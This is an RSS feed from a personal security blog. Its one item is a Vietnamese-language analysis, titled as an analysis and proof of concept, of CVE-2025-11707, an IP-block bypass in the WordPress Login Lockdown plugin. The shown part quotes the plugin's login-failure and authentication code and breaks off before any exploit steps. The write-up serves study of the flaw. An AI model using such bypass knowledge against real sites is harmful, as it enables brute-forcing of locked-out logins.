<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Bui Van Y</title>
    <link>http://localhost:1313/vi/</link>
    <description>Bui Van Y</description>
    <generator>Hugo 0.153.2 &amp; FixIt v0.4.0-alpha.3-20251225101113-8ffb9a95</generator>
    <language>vi</language>
    <managingEditor>w41bu1@gmail.com (Bui Van Y)</managingEditor>
    <webMaster>w41bu1@gmail.com (Bui Van Y)</webMaster>
    <lastBuildDate>Thu, 22 Jan 2026 23:05:57 +0700</lastBuildDate>
    <atom:link href="http://localhost:1313/vi/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>CVE-2025-11707 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2026-01-22-cve-2025-11707/</link>
      <pubDate>Thu, 22 Jan 2026 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2026-01-22-cve-2025-11707/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2026-01-22-cve-2025-11707/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin Login Lockdown &amp;amp; Protection cho WordPress b·ªã t·ªìn t·∫°i l·ªó h·ªïng cho ph√©p &lt;strong&gt;v∆∞·ª£t qua c∆° ch·∫ø ch·∫∑n IP&lt;/strong&gt; trong t·∫•t c·∫£ c√°c phi√™n b·∫£n t·ª´ tr∆∞·ªõc ƒë·∫øn &lt;strong&gt;2.14 (bao g·ªìm c·∫£ 2.14)&lt;/strong&gt;. Nguy√™n nh√¢n l√† do kh√≥a &lt;code&gt;$unblock_key&lt;/code&gt; kh√¥ng ƒë·ªß ng·∫´u nhi√™n, khi·∫øn nh·ªØng ng∆∞·ªùi d√πng &lt;strong&gt;ch∆∞a x√°c th·ª±c&lt;/strong&gt; nh∆∞ng c√≥ quy·ªÅn truy c·∫≠p v√†o email c·ªßa t√†i kho·∫£n qu·∫£n tr·ªã c√≥ th·ªÉ &lt;strong&gt;t·∫°o ra kh√≥a m·ªü ch·∫∑n h·ª£p l·ªá cho ƒë·ªãa ch·ªâ IP c·ªßa h·ªç&lt;/strong&gt;. ƒêi·ªÅu n√†y cho ph√©p k·∫ª t·∫•n c√¥ng ch∆∞a x√°c th·ª±c &lt;strong&gt;v∆∞·ª£t qua vi·ªác b·ªã ch·∫∑n do ƒëƒÉng nh·∫≠p sai nhi·ªÅu l·∫ßn&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-11707&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-11707&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Bypass Vulnerability&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 2.14&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 2.15&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (5.3)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/login-lockdown/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Login Lockdown Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;Login Lockdown&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;2.14&lt;/code&gt; ‚Äì &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;2.15&lt;/code&gt; ‚Äì &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; ‚Üí &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• diff n√†o.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;div class=&#34;alert alert-note&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M0 8a8 8 0 1116 0A8 8 0 010 8zm8-6.5a6.5 6.5.0 100 13 6.5 6.5.0 000-13zM6.5 7.75A.75.75.0 017.25 7h1a.75.75.0 01.75.75v2.75h.25a.75.75.0 010 1.5h-2a.75.75.0 010-1.5h.25v-2h-.25a.75.75.0 01-.75-.75zM8 6a1 1 0 110-2 1 1 0 010 2z&#34;/&gt;&lt;/svg&gt;Ghi ch√∫&lt;/p&gt;&lt;p&gt;Theo m√¥ t·∫£ c·ªßa CVE, l·ªó h·ªïng cho ph√©p k·∫ª t·∫•n c√¥ng v∆∞·ª£t qua c∆° ch·∫ø ch·∫∑n IP sau nhi·ªÅu l·∫ßn ƒëƒÉng nh·∫≠p th·∫•t b·∫°i.&#xA;Tr∆∞·ªõc khi ph√¢n t√≠ch k·ªπ thu·∫≠t bypass, c·∫ßn hi·ªÉu r√µ &lt;strong&gt;c√°ch plugin th·ª±c hi·ªán c∆° ch·∫ø block&lt;/strong&gt;.&lt;/p&gt;&lt;/div&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;increment-fails&#34;&gt;&lt;span&gt;Increment Fails&lt;/span&gt;&#xA;  &lt;a href=&#34;#increment-fails&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Plugin ƒëƒÉng k√Ω action hook cho s·ª± ki·ªán ƒëƒÉng nh·∫≠p th·∫•t b·∫°i:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action(&amp;#39;wp_login_failed&amp;#39;, array(&amp;#39;LoginLockdown_Functions&amp;#39;, &amp;#39;loginFailed&amp;#39;), 10, 2);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Khi ƒëƒÉng nh·∫≠p th·∫•t b·∫°i, WordPress s·∫Ω g·ªçi h√†m &lt;code&gt;loginFailed()&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;static function loginFailed($username, $error)&#xA;{&#xA;    self::incrementFails($username, $error-&amp;gt;get_error_code());&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m n√†y ti·∫øp t·ª•c g·ªçi &lt;code&gt;incrementFails()&lt;/code&gt; ƒë·ªÉ l∆∞u l·∫°i l·∫ßn ƒëƒÉng nh·∫≠p th·∫•t b·∫°i c√πng m√£ l·ªói:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;static function incrementFails($username = &amp;#34;&amp;#34;, $reason = &amp;#34;&amp;#34;)&#xA;{&#xA;    global $wpdb;&#xA;    $options = LoginLockdown_Setup::get_options();&#xA;    $ip = LoginLockdown_Utility::getUserIP();&#xA;&#xA;    $username = sanitize_user($username);&#xA;    $user = get_user_by(&amp;#39;login&amp;#39;, $username);&#xA;&#xA;    if ($user || 1 == $options[&amp;#39;lockout_invalid_usernames&amp;#39;]) {&#xA;      if ($user === false) {&#xA;        $user_id = -1;&#xA;      } else {&#xA;        $user_id = $user-&amp;gt;ID;&#xA;      }&#xA;&#xA;      //phpcs:ignore no need to cache&#xA;      $wpdb-&amp;gt;insert( //phpcs:ignore&#xA;        $wpdb-&amp;gt;lockdown_login_fails,&#xA;        array(&#xA;          &amp;#39;user_id&amp;#39; =&amp;gt; $user_id,&#xA;          &amp;#39;login_attempt_date&amp;#39; =&amp;gt; current_time(&amp;#39;mysql&amp;#39;),&#xA;          &amp;#39;login_attempt_IP&amp;#39; =&amp;gt; $ip,&#xA;          &amp;#39;failed_user&amp;#39; =&amp;gt; $username,&#xA;          &amp;#39;reason&amp;#39; =&amp;gt; $reason&#xA;        )&#xA;      );&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong c∆° s·ªü d·ªØ li·ªáu, c√°c b·∫£n ghi ƒë∆∞·ª£c l∆∞u nh∆∞ sau:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;mysql&amp;gt; select * from wp_login_fails;&#xA;&amp;#43;------------------&amp;#43;---------&amp;#43;---------------------&amp;#43;------------------&amp;#43;-------------&amp;#43;------------------&amp;#43;&#xA;| login_attempt_ID | user_id | login_attempt_date  | login_attempt_IP | failed_user | reason           |&#xA;&amp;#43;------------------&amp;#43;---------&amp;#43;---------------------&amp;#43;------------------&amp;#43;-------------&amp;#43;------------------&amp;#43;&#xA;|                5 |      -1 | 2026-01-22 03:07:05 | 172.18.0.1       | a           | invalid_username |&#xA;|                6 |      -1 | 2026-01-22 03:24:09 | 172.18.0.1       | a           | invalid_username |&#xA;&amp;#43;------------------&amp;#43;---------&amp;#43;---------------------&amp;#43;------------------&amp;#43;-------------&amp;#43;------------------&amp;#43;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Nh∆∞ v·∫≠y, m·ªói l·∫ßn ƒëƒÉng nh·∫≠p th·∫•t b·∫°i s·∫Ω ƒë∆∞·ª£c ghi l·∫°i k√®m theo IP, username v√† l√Ω do l·ªói.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;authentication--block&#34;&gt;&lt;span&gt;Authentication &amp;amp; Block&lt;/span&gt;&#xA;  &lt;a href=&#34;#authentication--block&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Plugin can thi·ªáp tr·ª±c ti·∫øp v√†o qu√° tr√¨nh x√°c th·ª±c b·∫±ng c√°ch ƒëƒÉng k√Ω filter &lt;code&gt;authenticate&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_filter(&amp;#39;authenticate&amp;#39;, array(&amp;#39;LoginLockdown_Functions&amp;#39;, &amp;#39;wp_authenticate_username_password&amp;#39;), 20, 3);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m &lt;code&gt;wp_authenticate_username_password()&lt;/code&gt; ƒë∆∞·ª£c th·ª±c thi trong qu√° tr√¨nh ƒëƒÉng nh·∫≠p v√† c√≥ vai tr√≤ ki·ªÉm so√°t vi·ªác cho ph√©p hay ch·∫∑n x√°c th·ª±c.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;static function wp_authenticate_username_password($user, $username, $password)&#xA;{&#xA;    if (is_a($user, &amp;#39;WP_User&amp;#39;)) {&#xA;      return $user;&#xA;    }&#xA;&#xA;    $options = LoginLockdown_Setup::get_options();&#xA;&#xA;    $whitelisted = false;&#xA;    $user_ip = LoginLockdown_Utility::getUserIP();&#xA;    if (in_array($user_ip, $options[&amp;#39;whitelist&amp;#39;])) {&#xA;      $whitelisted = true;&#xA;    }&#xA;&#xA;    if (!$whitelisted &amp;amp;&amp;amp; self::isLockedDown()) {&#xA;      self::lockdown_screen($options[&amp;#39;block_message&amp;#39;]);&#xA;      return new WP_Error(&amp;#39;lockdown_fail_count&amp;#39;, __(&amp;#34;&amp;lt;strong&amp;gt;ERROR&amp;lt;/strong&amp;gt;: We&amp;#39;re sorry, but this IP has been blocked due to too many recent failed login attempts.&amp;lt;br /&amp;gt;&amp;lt;br /&amp;gt;Please try again later.&amp;#34;, &amp;#39;login-lockdown&amp;#39;));&#xA;    }&#xA;&#xA;    if (!$username) {&#xA;      return $user;&#xA;    }&#xA;&#xA;    if (self::is_rest_request()) {&#xA;      return $user;&#xA;    }&#xA;&#xA;    $captcha = self::handle_captcha();&#xA;    if (is_wp_error($captcha)) {&#xA;      if ($options[&amp;#39;max_login_retries&amp;#39;] &amp;lt;= self::countFails($username) &amp;amp;&amp;amp; self::countFails($username) &amp;gt; 0) {&#xA;        self::lockDown($username, &amp;#39;Too many captcha fails&amp;#39;);&#xA;      }&#xA;      return $captcha;&#xA;    }&#xA;&#xA;    $userdata = get_user_by(&amp;#39;login&amp;#39;, $username);&#xA;&#xA;    if (!$whitelisted &amp;amp;&amp;amp; $options[&amp;#39;max_login_retries&amp;#39;] &amp;lt;= self::countFails($username)) {&#xA;      if ($options[&amp;#39;max_login_retries&amp;#39;] &amp;lt;= self::countFails($username) &amp;amp;&amp;amp; self::countFails($username) &amp;gt; 0) {&#xA;        self::lockDown($username, &amp;#39;Too many fails&amp;#39;);&#xA;      }&#xA;&#xA;      return new WP_Error(&amp;#39;lockdown_fail_count&amp;#39;, __(&amp;#34;&amp;lt;strong&amp;gt;ERROR&amp;lt;/strong&amp;gt;: We&amp;#39;re sorry, but this IP has been blocked due to too many recent failed login attempts.&amp;lt;br /&amp;gt;&amp;lt;br /&amp;gt;Please try again later.&amp;#34;, &amp;#39;login-lockdown&amp;#39;));&#xA;    }&#xA;&#xA;    if (empty($username) || empty($password)) {&#xA;      $error = new WP_Error();&#xA;&#xA;      if (empty($username))&#xA;        $error-&amp;gt;add(&amp;#39;empty_username&amp;#39;, __(&amp;#39;&amp;lt;strong&amp;gt;ERROR&amp;lt;/strong&amp;gt;: The username field is empty.&amp;#39;, &amp;#39;login-lockdown&amp;#39;));&#xA;&#xA;      if (empty($password))&#xA;        $error-&amp;gt;add(&amp;#39;empty_password&amp;#39;, __(&amp;#39;&amp;lt;strong&amp;gt;ERROR&amp;lt;/strong&amp;gt;: The password field is empty.&amp;#39;, &amp;#39;login-lockdown&amp;#39;));&#xA;&#xA;      return $error;&#xA;    }&#xA;&#xA;    if ($userdata === false) {&#xA;      /* translators: %s is the url of the WordPress lost password page. */&#xA;      return new WP_Error(&amp;#39;invalid_username&amp;#39;, sprintf(__(&amp;#39;&amp;lt;strong&amp;gt;ERROR&amp;lt;/strong&amp;gt;: Invalid username. &amp;lt;a href=&amp;#34;%s&amp;#34; title=&amp;#34;Password Lost and Found&amp;#34;&amp;gt;Lost your password&amp;lt;/a&amp;gt;?&amp;#39;, &amp;#39;login-lockdown&amp;#39;), site_url(&amp;#39;wp-login.php?action=lostpassword&amp;#39;, &amp;#39;login&amp;#39;)));&#xA;    }&#xA;&#xA;    $userdata = apply_filters(&amp;#39;wp_authenticate_user&amp;#39;, $userdata, $password);&#xA;    if (is_wp_error($userdata)) {&#xA;      return $userdata;&#xA;    }&#xA;&#xA;    if (!is_string($password) || !is_string($userdata-&amp;gt;user_pass) || is_null($userdata-&amp;gt;ID) || !wp_check_password($password, $userdata-&amp;gt;user_pass, $userdata-&amp;gt;ID)) {&#xA;      /* translators: %s is the url of the WordPress lost password page. */&#xA;      return new WP_Error(&amp;#39;incorrect_password&amp;#39;, sprintf(__(&amp;#39;&amp;lt;strong&amp;gt;ERROR&amp;lt;/strong&amp;gt;: Incorrect password. &amp;lt;a href=&amp;#34;%s&amp;#34; title=&amp;#34;Password Lost and Found&amp;#34;&amp;gt;Lost your password&amp;lt;/a&amp;gt;?&amp;#39;, &amp;#39;login-lockdown&amp;#39;), site_url(&amp;#39;wp-login.php?action=lostpassword&amp;#39;, &amp;#39;login&amp;#39;)));&#xA;    }&#xA;&#xA;    $user =  new WP_User($userdata-&amp;gt;ID);&#xA;    return $user;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ol&gt;&#xA;&lt;li&gt;&lt;strong&gt;B·ªè qua n·∫øu ng∆∞·ªùi d√πng ƒë√£ ƒë∆∞·ª£c x√°c th·ª±c&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;if (is_a($user, &amp;#39;WP_User&amp;#39;)) {&#xA;    return $user;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;N·∫øu WordPress ƒë√£ x√°c th·ª±c th√†nh c√¥ng t·ª´ tr∆∞·ªõc, plugin kh√¥ng can thi·ªáp th√™m.&lt;/p&gt;&#xA;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;&lt;strong&gt;Ki·ªÉm tra whitelist v√† tr·∫°ng th√°i b·ªã kh√≥a&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$user_ip = LoginLockdown_Utility::getUserIP();&#xA;if (in_array($user_ip, $options[&amp;#39;whitelist&amp;#39;])) {&#xA;    $whitelisted = true;&#xA;}&#xA;&#xA;if (!$whitelisted &amp;amp;&amp;amp; self::isLockedDown()) {&#xA;    self::lockdown_screen($options[&amp;#39;block_message&amp;#39;]);&#xA;    return new WP_Error(&amp;#39;lockdown_fail_count&amp;#39;, &amp;#39;IP has been blocked&amp;#39;);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;N·∫øu IP kh√¥ng n·∫±m trong whitelist v√† ƒëang b·ªã kh√≥a, h·ªá th·ªëng s·∫Ω ch·∫∑n ƒëƒÉng nh·∫≠p ngay l·∫≠p t·ª©c.&lt;/p&gt;&#xA;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;&lt;strong&gt;B·ªè qua trong m·ªôt s·ªë tr∆∞·ªùng h·ª£p ƒë·∫∑c bi·ªát&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;if (!$username) return $user;&#xA;if (self::is_rest_request()) return $user;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;N·∫øu kh√¥ng c√≥ username ho·∫∑c l√† REST request, plugin kh√¥ng √°p d·ª•ng ki·ªÉm so√°t ƒëƒÉng nh·∫≠p.&lt;/p&gt;&#xA;&lt;ol start=&#34;4&#34;&gt;&#xA;&lt;li&gt;&lt;strong&gt;X·ª≠ l√Ω CAPTCHA&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$captcha = self::handle_captcha();&#xA;if (is_wp_error($captcha)) {&#xA;    if ($options[&amp;#39;max_login_retries&amp;#39;] &amp;lt;= self::countFails($username)) {&#xA;        self::lockDown($username, &amp;#39;Too many captcha fails&amp;#39;);&#xA;    }&#xA;    return $captcha;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;N·∫øu CAPTCHA th·∫•t b·∫°i v√† s·ªë l·∫ßn l·ªói v∆∞·ª£t ng∆∞·ª°ng, t√†i kho·∫£n/IP s·∫Ω b·ªã kh√≥a.&lt;/p&gt;&#xA;&lt;ol start=&#34;5&#34;&gt;&#xA;&lt;li&gt;&lt;strong&gt;Ki·ªÉm tra s·ªë l·∫ßn ƒëƒÉng nh·∫≠p th·∫•t b·∫°i&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;if (!$whitelisted &amp;amp;&amp;amp; $options[&amp;#39;max_login_retries&amp;#39;] &amp;lt;= self::countFails($username)) {&#xA;    self::lockDown($username, &amp;#39;Too many fails&amp;#39;);&#xA;    return new WP_Error(&amp;#39;lockdown_fail_count&amp;#39;, &amp;#39;IP has been blocked&amp;#39;);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;N·∫øu v∆∞·ª£t qu√° s·ªë l·∫ßn cho ph√©p, plugin s·∫Ω k√≠ch ho·∫°t c∆° ch·∫ø kh√≥a.&lt;/p&gt;&#xA;&lt;div class=&#34;alert alert-note&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M0 8a8 8 0 1116 0A8 8 0 010 8zm8-6.5a6.5 6.5.0 100 13 6.5 6.5.0 000-13zM6.5 7.75A.75.75.0 017.25 7h1a.75.75.0 01.75.75v2.75h.25a.75.75.0 010 1.5h-2a.75.75.0 010-1.5h.25v-2h-.25a.75.75.0 01-.75-.75zM8 6a1 1 0 110-2 1 1 0 010 2z&#34;/&gt;&lt;/svg&gt;Ghi ch√∫&lt;/p&gt;&lt;p&gt;&lt;code&gt;max_login_retries&lt;/code&gt; ƒë∆∞·ª£c setup trong Admin Dashboard, gi√° tr·ªã m·∫∑c ƒë·ªãnh s·∫Ω l√† &lt;code&gt;3&lt;/code&gt;&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-22-cve-2025-11707/max.png&#34; title=&#34;Max login retries&#34; data-thumbnail=&#34;/posts/2026-01-22-cve-2025-11707/max.png&#34; data-sub-html=&#34;&lt;h2&gt;Max login retries&lt;/h2&gt;&lt;p&gt;Max login retries&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-22-cve-2025-11707/max.png&#39; alt=&#34;Max login retries&#34; height=&#34;677&#34; width=&#34;1130&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Max login retries&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&lt;/div&gt;&lt;p&gt;=&amp;gt; Nh∆∞ v·∫≠y, ch·ªâ c·∫ßn &lt;strong&gt;3 l·∫ßn ƒëƒÉng nh·∫≠p th·∫•t b·∫°i li√™n ti·∫øp&lt;/strong&gt;, IP s·∫Ω b·ªã ƒë∆∞a v√†o tr·∫°ng th√°i b·ªã ch·∫∑n v√† m·ªçi l·∫ßn ƒëƒÉng nh·∫≠p ti·∫øp theo t·ª´ IP ƒë√≥ s·∫Ω b·ªã t·ª´ ch·ªëi ngay &lt;strong&gt;t·ª´ ƒë·∫ßu qu√° tr√¨nh x√°c 